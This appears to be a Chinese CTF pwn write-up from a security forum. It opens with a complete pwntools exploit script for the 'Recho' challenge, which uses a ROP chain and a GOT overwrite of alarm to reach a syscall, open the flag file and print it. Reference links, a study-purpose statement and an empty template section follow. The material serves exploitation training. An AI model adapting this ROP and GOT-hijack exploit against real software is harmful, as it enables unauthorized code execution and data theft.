
```python
import sys
from pwn import \*
from LibcSearcher import LibcSearcher
rv = lambda : io.recv()
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
se = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
sconnect = lambda : io.interactive()
context.log\_level = "DEBUG"
pwn\_file = './Recho'
elf = ELF(pwn\_file)
if len(sys.argv) < 2:
IS\_LOCAL = 1
io = process(pwn\_file)
else:
IS\_LOCAL = 0
sys\_argv = sys.argv[1].split(':')
io = remote(sys\_argv[0], int(sys\_argv[1]))
#---------------------------------------------------------
flag\_str = 0x0000000000601058
pop\_rax\_ret = 0x00000000004006fc
pop\_rdi\_ret = 0x00000000004008a3
save\_flag\_addr = 0x0000000000601060
add\_ptr\_rdi\_al = 0x000000000040070d
sysenter\_addr = alarm\_addr = elf.got['alarm']
def com\_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
payload = p64(part1) # part1 entry pop\_rbx\_pop\_rbp\_pop\_r12\_pop\_r13\_pop\_r14\_pop\_r15\_ret
payload += p64(0x0) # rbx must be 0x0
payload += p64(0x1) # rbp must be 0x1
payload += p64(jmp2) # r12 jump to
payload += p64(arg3) # r13 -> rdx arg3
payload += p64(arg2) # r14 -> rsi arg2
payload += p64(arg1) # r15 -> edx arg1
payload += p64(part2) # part2 entry will call [r12+rbx\*0x8]
payload += 'A' \* 56 # junk 6\*8+8=56
return payload
p1 = 0x40089A
p2 = 0x400880
payload = 'A'\*0x38+p64(pop\_rax\_ret)+p64(5)+p64(pop\_rdi\_ret)+p64(alarm\_addr)+p64(add\_ptr\_rdi\_al) \
+ p64(pop\_rax\_ret)+p64(2)+com\_gadget(p1,p2,sysenter\_addr,flag\_str,0) \
+ com\_gadget(p1,p2,elf.got['read'],3,save\_flag\_addr,50) \
+ com\_gadget(p1,p2,elf.got['write'],1,save\_flag\_addr,50)
if IS\_LOCAL:
gdb.attach(io,"break \*0x400889\nc")
pause()
rv()
se(str(len(payload)))
se(payload)
rv()
io.shutdown('write')
print(rv())
```

## 参考文章

1. 攻防世界PWN之Recho题解 [<mark class="encrypted">985K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4</mark> "<mark class="encrypted">048K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4</mark>")

2. 攻防世界PWN之note-service2题解 [<mark class="encrypted">0d5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9K6x3o6l9K6x3e0j5%4i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9K6x3o6l9K6x3e0j5%4</mark> "<mark class="encrypted">469K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9K6x3o6l9K6x3e0j5%4</mark>")

3. 攻防世界 Pwn 进阶 第一页 [<mark class="encrypted">ab7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4W2G2L8X3N6T1j5h3!0A6K9g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9&6x3o6f1&6y4U0x3H3i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4W2G2L8X3N6T1j5h3!0A6K9g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9&6x3o6f1&6y4U0x3H3</mark> "<mark class="encrypted">314K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4W2G2L8X3N6T1j5h3!0A6K9g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9&6x3o6f1&6y4U0x3H3</mark>")

4. CTF-ALL-IN-ONE 四、技巧篇 [<mark class="encrypted">c66K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8S2L8r3I4Q4x3X3c8A6L8W2)9J5k6r3!0F1k6g2)9J5c8U0c8Q4y4h3k6@1K9i4m8K6i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8S2L8r3I4Q4x3X3c8A6L8W2)9J5k6r3!0F1k6g2)9J5c8U0c8Q4y4h3k6@1K9i4m8K6</mark> "<mark class="encrypted">87aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8S2L8r3I4Q4x3X3c8A6L8W2)9J5k6r3!0F1k6g2)9J5c8U0c8Q4y4h3k6@1K9i4m8K6</mark>")

5. 详解64位静态编译程序的fini_array劫持及ROP攻击 <a href="elink@f9cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9"><mark class="encrypted">3faK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9</mark></a>

## 目的

通过攻防世界的一些入门难度的题目来学习最基本的漏洞利用技巧，以及提高代码审计的能力。传送门：[192K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3q4E0M7q4)9K6b7X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6S2L8i4m8Q4x3@1u0Y4M7X3q4V1k6g2)9K6c8o6p5`.](https://bbs.kanxue.com/elink@c63K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3q4E0M7q4)9K6b7X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6S2L8i4m8Q4x3@1u0Y4M7X3q4V1k6g2)9K6c8o6p5`.)

## 脑图

总结可能用到的知识点：

![](https://bbs.kanxue.com/upload/attach/202106/800468_PRYDPCNQ8PFHD8N.jpg)

## 脚本模板

放上我常用的做题模板：

|  |  |
| --- | --- |
